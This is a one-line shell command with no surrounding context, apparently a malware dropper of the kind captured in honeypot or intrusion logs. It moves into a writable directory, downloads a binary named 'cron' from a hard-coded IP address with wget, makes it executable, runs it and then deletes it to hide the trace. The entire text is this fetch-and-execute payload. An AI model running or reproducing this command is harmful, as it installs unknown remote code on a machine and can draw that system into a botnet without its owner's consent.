cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.131.121.118/cron; chmod +x cron; ./cron; rm -rf cron
